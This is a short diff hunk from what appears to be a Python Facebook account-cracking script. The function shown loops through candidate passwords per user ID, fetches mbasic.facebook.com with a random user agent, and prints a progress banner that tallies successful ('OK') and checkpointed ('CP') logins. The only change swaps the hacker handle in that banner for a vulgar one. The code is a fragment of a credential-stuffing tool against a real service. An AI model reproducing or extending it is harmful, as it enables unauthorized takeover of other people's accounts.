@@ -373,7 +373,7 @@ def c(uid,pwx,ln):
         for ps in pwx:
             session = requests.Session()
             wa = random.choice(my_color)
-            sys.stdout.write(f'\r%s[RAKIB_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
+            sys.stdout.write(f'\r%s[HR1DOY_FUCK3R] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
